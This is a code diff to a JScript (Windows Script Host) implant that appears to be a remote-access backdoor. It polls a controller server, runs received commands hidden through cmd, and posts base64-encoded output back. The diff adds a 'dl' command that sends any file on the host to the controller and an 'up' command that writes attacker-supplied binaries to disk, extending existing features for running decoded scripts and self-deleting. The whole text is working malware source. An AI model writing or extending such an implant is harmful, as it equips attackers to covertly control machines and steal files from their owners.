@@ -67,6 +67,25 @@ function post(home, response) {
   return res;
 }
 
+function writebinfile(filename, content) {
+	var stream = WScript.CreateObject("ADODB.Stream")
+	stream.Open()	
+	stream.Type = 1 //adTypeBinary
+	stream.Write(content)
+	stream.SaveToFile(filename)
+	stream.Close()
+}
+
+function readbinfile(filename) {
+	var stream = WScript.CreateObject("ADODB.Stream")
+	stream.Open()
+	stream.Type = 1 //adTypeBinary
+	stream.LoadFromFile(filename)
+	var bytes = stream.Read()
+	stream.Close()
+	return bytes
+}
+
 function str2bin(data) {
    var istream = WScript.CreateObject("ADODB.Stream");
    istream.Type = 2
@@ -78,11 +97,16 @@ function str2bin(data) {
    return istream.Read()
 }
 function b64e(data) {
-   var xml = WScript.CreateObject("MSXml2.DOMDocument");
-   var element = xml.createElement("Base64Data");
-   element.dataType = "bin.base64";
-   element.nodeTypedValue = str2bin(data);
-   return element.text.replace(/\n/g, "");
+  var xml = WScript.CreateObject("MSXml2.DOMDocument");
+  var element = xml.createElement("Base64Data");
+  element.dataType = "bin.base64";
+  if(typeof(data) == "string") {
+    element.nodeTypedValue = str2bin(data);
+  }
+  else {
+    element.nodeTypedValue = data;
+  }
+  return element.text.replace(/\n/g, "");
 }
 
 function bin2str(data) {
@@ -95,12 +119,18 @@ function bin2str(data) {
   istream.CharSet = "us-ascii"
   return istream.ReadText()
 }
-function b64d(data) {
+
+function b64d(data, type) {
   var xml = WScript.CreateObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
   element.dataType = "bin.base64"
   element.text = data
-  return bin2str(element.nodeTypedValue)
+  if(type == "bin") {
+    return element.nodeTypedValue
+  }
+  else {
+    return bin2str(element.nodeTypedValue)
+  }
 }
 
 //Main
@@ -116,6 +146,7 @@ while(true)
 
     if(jsObject.cmnd)
     {
+		var rettype = "retval"
 	    //kill
 	    if(jsObject.cmnd == "quit") {
         if(fso.FileExists(selfpath)) {
@@ -138,7 +169,7 @@ while(true)
       else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
          fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
          msb = jsObject.cmnd.split(" ")[1]
-         msbdata = b64d(jsObject.cmnd.split(" ")[2])
+         msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
          fd.WriteLine(msbdata)
          fd.close()
          runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
@@ -155,8 +186,36 @@ while(true)
           fso.DeleteFile(temp + "\\" + id + ".txt", true)
         }
       }
+	  
+	  	else if(jsObject.cmnd.split(" ")[0] == "dl") {
+	      var array = jsObject.cmnd.split(" ")
+		  array.shift() //Cuts off the first element in the array
+		  var filepath = array.join(" ")
+	      if(fso.FileExists(filepath)) {
+		    retval = readbinfile(filepath)
+		    rettype = "dl"
+		}
+		else {
+		  retval = "[!] Could not read file: " + filepath
+		}
+	  }
 
-	    //credit to nate and 0sum <3
+	  	else if(jsObject.cmnd.split(" ")[0] == "up") {
+                  try {
+                    var array = jsObject.cmnd.split(" ")
+                    content = b64d(array[1], "bin")
+                    array.shift()
+                    array.shift()
+                    filename = array.join(" ")
+                    writebinfile(filename, content)
+                    retval = "[*] File uploaded: " + filename
+                  }
+                  catch (e) {
+                    retval = "[-] Could not upload file: " + filename
+                  }
+                }
+
+	    //credit to nate and 0sum
 	    else {
         runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
 		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
@@ -169,7 +228,7 @@ while(true)
 		      retval = "[!] Error getting output"
 	      }
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64e(retval)+'"}';
+      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
       post(home, resp)
     }
@@ -179,3 +238,4 @@ while(true)
   }
   WScript.Sleep(sleepytime);
 }
+
